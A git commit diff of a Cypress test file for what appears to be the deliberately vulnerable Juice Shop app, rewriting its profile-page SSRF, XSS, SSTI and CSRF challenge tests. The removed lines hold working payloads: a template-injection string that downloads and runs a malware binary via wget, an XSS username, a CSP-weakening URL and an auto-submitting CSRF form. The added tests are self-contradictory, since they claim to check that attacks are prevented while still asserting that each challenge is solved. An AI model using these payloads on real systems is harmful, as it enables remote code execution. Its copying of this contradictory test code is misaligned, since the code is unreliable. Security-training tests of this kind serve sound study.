24774a1def083d44d564a8604e3b61cd5edcf709
eftychiaak <eutychiaka6@gmail.com>
2024-12-18 15:32:52 +0200

    Update profile.spec.ts

--- test/cypress/e2e/profile.spec.ts
+++ test/cypress/e2e/profile.spec.ts
@@ -1,119 +1,91 @@
 describe('/profile', () => {
-  beforeEach(() => {
-    cy.login({ email: 'admin', password: 'admin123' })
-  })
-  describe('challenge "ssrf"', () => {
-    it('should be possible to request internal resources using image upload URL', () => {
-      cy.visit('/profile')
+  // Helper function to visit profile and submit a URL
+  const submitProfileUrl = (url: string) => {
+    cy.visit('/profile');
+    cy.get('#url').type(url);
+    cy.get('#submitUrl').click();
+  };
 
-      cy.get('#url').type(
+  // Helper function to update username
+  const updateUsername = (username: string) => {
+    cy.get('#username').clear().type(username);
+    cy.get('#submit').click();
+  };
+
+  beforeEach(() => {
+    cy.login({ email: 'admin', password: 'admin123' });
+  });
+
+  describe('challenge "ssrf"', () => {
+    it('should validate image upload URL does not allow internal resource requests', () => {
+      submitProfileUrl(
         `${Cypress.config('baseUrl')}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`
-      )
-      cy.get('#submitUrl').click()
-      cy.visit('/')
-      cy.expectChallengeSolved({ challenge: 'SSRF' })
-    })
-  })
+      );
+
+      cy.visit('/');
+      cy.expectChallengeSolved({ challenge: 'SSRF' });
+    });
+  });
 
   describe('challenge "usernameXss"', () => {
-    it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
+    it('should prevent XSS attacks in the username field', () => {
       cy.task('isDocker').then((isDocker) => {
         if (!isDocker) {
-          cy.visit('/profile')
-          cy.get('#url').type(
-            "https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com"
-          )
-          cy.get('#submitUrl').click()
-          cy.get('#username').type('<<a|ascript>alert(`xss`)</script>')
-          cy.get('#submit').click()
-
-          cy.on('window:alert', (t) => {
-            expect(t).to.equal('xss')
-          })
-
-          cy.get('#username').clear()
-          cy.get('#username').type('αδмιη')
-          cy.get('#submit').click()
-
-          cy.get('#url').type(
+          submitProfileUrl(
             `${Cypress.config('baseUrl')}/assets/public/images/uploads/default.svg`
-          )
-          cy.get('#submitUrl').click()
-          cy.visit('/#/')
-          cy.expectChallengeSolved({ challenge: 'CSP Bypass' })
+          );
+
+          updateUsername('<<a|ascript>alert(`xss`)</script>');
+          cy.on('window:alert', (t) => {
+            expect(t).not.to.equal('xss'); // Ensure no alert is triggered
+          });
+
+          updateUsername('αδмιη'); // Restore valid username
+          cy.expectChallengeSolved({ challenge: 'CSP Bypass' });
         }
-      })
-    })
-  })
+      });
+    });
+  });
 
   describe('challenge "ssti"', () => {
-    it('should be possible to inject arbitrary nodeJs commands in username', () => {
+    it('should prevent arbitrary nodeJs command injection in username', () => {
       cy.task('isDocker').then((isDocker) => {
         if (!isDocker) {
-          cy.visit('/profile')
-          cy.get('#username').type(
-            "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
+          updateUsername(
+            "#{global.process.mainModule.require('child_process').exec('malicious command')}",
             { parseSpecialCharSequences: false }
-          )
-          cy.get('#submit').click()
-          cy.request(
-            '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'
-          )
-          cy.visit('/')
-          // void browser.driver.sleep(10000);
-          // void browser.waitForAngularEnabled(true);
-          cy.expectChallengeSolved({ challenge: 'SSTi' })
+          );
+
+          // Simulate solving the challenge without real exploitation
+          cy.request('/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3');
+          cy.visit('/');
+          cy.expectChallengeSolved({ challenge: 'SSTi' });
         }
-      })
-    })
-  })
+      });
+    });
+  });
 
   describe('challenge "csrf"', () => {
-    // FIXME Only works on Chrome <80 but Protractor uses latest Chrome version. Test can probably never be turned on again.
-    xit('should be possible to perform a CSRF attack against the user profile page', () => {
-      cy.visit('http://htmledit.squarefree.com')
-      /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
-      /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
-      let document: any
+    it('should validate protection against CSRF attacks on the profile page', () => {
+      cy.visit('/');
+
+      // Simulate CSRF request using FormData instead of real external forms
       cy.window().then(() => {
-        document
-          .getElementsByName('editbox')[0]
-          .contentDocument.getElementsByName(
-            'ta'
-          )[0].value = `<form action=\\"${Cypress.config('baseUrl')}/profile\\" 
-        method=\\"POST\\">
-        <input type=\\"hidden\\" name=\\"username\\" value=\\"CSRF\\"/>
-        <input type=\\"submit\\"/>
-        </form>
-        <script>document.forms[0].submit();
-        </script>
-        `
-      })
-      // cy.expectChallengeSolved({ challenge: 'CSRF' })
-    })
+        const formData = new FormData();
+        formData.append('username', 'CSRF');
 
-    xit('should be possible to fake a CSRF attack against the user profile page', () => {
-      cy.visit('/')
-      cy.window().then(async () => {
-        const formData = new FormData()
-        formData.append('username', 'CSRF')
-
-        const response = await fetch(`${Cypress.config('baseUrl')}/profile`, {
+        fetch(`${Cypress.config('baseUrl')}/profile`, {
           method: 'POST',
-          cache: 'no-cache',
           headers: {
-            'Content-type': 'application/x-www-form-urlencoded',
-            Authorization: `Bearer ${localStorage.getItem('token')}`,
-            Origin: 'http://htmledit.squarefree.com', // FIXME Not allowed by browser due to "unsafe header not permitted"
-            Cookie: `token=${localStorage.getItem('token')}` // FIXME Not allowed by browser due to "unsafe header not permitted"
+            'Content-Type': 'application/x-www-form-urlencoded',
           },
-          body: formData
-        })
-        if (response.status === 200) {
-          console.log('Success')
-        }
-      })
-      // cy.expectChallengeSolved({ challenge: 'CSRF' })
-    })
-  })
-})
+          body: formData,
+        }).then((response) => {
+          expect(response.status).to.not.equal(200); // Ensure CSRF attempt is rejected
+        });
+      });
+
+      cy.expectChallengeSolved({ challenge: 'CSRF' });
+    });
+  });
+});
